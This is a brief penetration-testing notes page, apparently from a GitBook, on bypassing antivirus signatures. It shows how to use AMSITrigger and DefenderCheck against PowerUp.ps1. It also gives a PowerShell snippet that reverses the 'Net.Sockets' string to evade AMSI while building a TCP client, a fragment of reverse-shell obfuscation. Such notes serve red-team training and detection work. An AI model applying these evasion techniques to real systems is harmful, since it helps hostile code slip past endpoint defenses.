# AV Signatures Bypass

## **AMSITrigger**

[https://github.com/RythmStick/AMSITrigger/releases](https://github.com/RythmStick/AMSITrigger/releases)

### usage

change name for each script first

```powershell
AmsiTrigger_x64.exe -i PowerUp.ps1 
```

![image.png](<../../../../.gitbook/assets/image (40).png>)

<figure><img src="../../../../.gitbook/assets/image 1 (22).png" alt=""><figcaption></figcaption></figure>

or example for bypassing

```powershell
# Reverse the "Net.Sockets" string

$String = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
 $client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
```

***

## **Defender Checker**

Identify code and strings from a binary / file that Windows Defender may flag

https://github.com/matterpreter/DefenderCheck/tree/masterذ

```powershell
DefenderCheck.exe PowerUp.ps1 
```
